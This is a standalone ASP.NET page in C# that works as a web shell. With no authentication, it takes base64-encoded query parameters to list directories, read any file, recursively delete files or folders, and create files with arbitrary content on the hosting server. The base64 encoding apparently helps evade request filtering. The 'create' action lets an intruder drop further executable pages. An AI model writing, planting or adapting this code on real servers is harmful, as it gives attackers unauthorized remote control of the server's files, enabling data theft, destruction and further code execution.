<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>

<%
try
{
    string encodedPath = Request.QueryString["path"];
    string action = Request.QueryString["action"];

    if (string.IsNullOrEmpty(encodedPath))
    {
        Response.Write("Missing path parameter");
        return;
    }

    if (string.IsNullOrEmpty(action))
    {
        Response.Write("Missing action parameter");
        return;
    }

	string path = Encoding.UTF8.GetString(Convert.FromBase64String(encodedPath));

    switch (action.ToLower())
    {
        case "list":

            try
            {
                

                if (!Directory.Exists(path))
                {
                    Response.Write("Directory not found");
                    return;
                }

                Response.Write("<h3>Directories</h3>");

                foreach (string dir in Directory.GetDirectories(path))
                {
                    Response.Write(Server.HtmlEncode(dir) + "<br/>");
                }

                Response.Write("<h3>Files</h3>");

                foreach (string file in Directory.GetFiles(path))
                {
                    Response.Write(Server.HtmlEncode(file) + "<br/>");
                }
            }
            catch (FormatException)
            {
                Response.Write("Invalid Base64");
            }
            catch (UnauthorizedAccessException)
            {
                Response.Write("Access denied.");
            }

            break;
			
		case "read":
			try
			{
				if (!File.Exists(path))
				{
					Response.Write("File not found");
					return;
				}

				string content = File.ReadAllText(path);
				Response.Write("<pre>" + Server.HtmlEncode(content) + "</pre>");
			}
			catch (FormatException)
			{
				Response.Write("Invalid Base64");
			}
			catch (UnauthorizedAccessException)
			{
				Response.Write("Access denied.");
			}
			break;
        
        case "delete":
            try
            {
                if (File.Exists(path))
                {
                    File.Delete(path);
                    Response.Write("File deleted");
                }
                else if (Directory.Exists(path))
                {
                    Directory.Delete(path, true);
                    Response.Write("Directory deleted");
                }
                else
                {
                    Response.Write("File or directory not found");
                }
            }
            catch (FormatException)
            {
                Response.Write("Invalid Base64");
            }
            catch (UnauthorizedAccessException)
            {
                Response.Write("Access denied.");
            }
            break;

        case "create":
            try
            {
                if (File.Exists(path) || Directory.Exists(path))
                {
                    Response.Write("File or directory already exists");
                    return;
                }

                if (path.EndsWith("/"))
                {
                    Directory.CreateDirectory(path);
                    Response.Write("Directory created");
                }
                else
                {
                    File.Create(path).Close();
                    
                    String b64content = Request.QueryString["content"];

                    String content = Encoding.UTF8.GetString(Convert.FromBase64String(b64content));


                    if (!string.IsNullOrEmpty(content))
                    {
                        File.WriteAllText(path, content);
                    }

                    Response.Write("File created");
                }
            }
            catch (FormatException)
            {
                Response.Write("Invalid Base64");
            }
            catch (UnauthorizedAccessException)
            {
                Response.Write("Access denied.");
            }
            break;

        default:
            Response.Write("Invalid action");
            break;
    }
}
catch (Exception ex)
{
    Response.Write(Server.HtmlEncode(ex.Message));
}
%>
